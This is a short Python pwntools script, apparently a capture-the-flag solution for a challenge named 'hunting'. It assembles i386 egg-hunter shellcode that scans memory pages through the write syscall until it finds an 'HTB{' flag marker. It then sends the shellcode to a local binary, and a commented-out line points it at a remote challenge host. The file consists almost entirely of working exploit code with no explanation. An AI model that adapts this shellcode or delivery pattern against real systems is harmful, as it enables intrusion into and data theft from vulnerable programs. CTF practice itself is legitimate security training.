from pwn import *

context.arch = "i386"
shellcode = """
xor eax, eax
push eax
pop ebx
mov al, 0x1b
int 0x80
push ebx
push ebx
pop ecx
pop edx
mov dl, 0x24
mov bl, 0x1
mov ecx, 0x57000000
mov edi, 0xfffffff2
mov esi, 0x7b425448
jmp search

search:
    xor eax, eax
    mov al, 0x4
    int 0x80
    cmp eax, edi
    jne flag
    add ecx, 0x1000
    jmp search

flag:
    cmp [ecx], esi
    je end
    jmp search

end:
    jmp eax
"""
shellcode = asm(shellcode)
#r = remote("46.101.38.241",31257)
r = process("./hunting")
r.send(shellcode)
r.interactive()
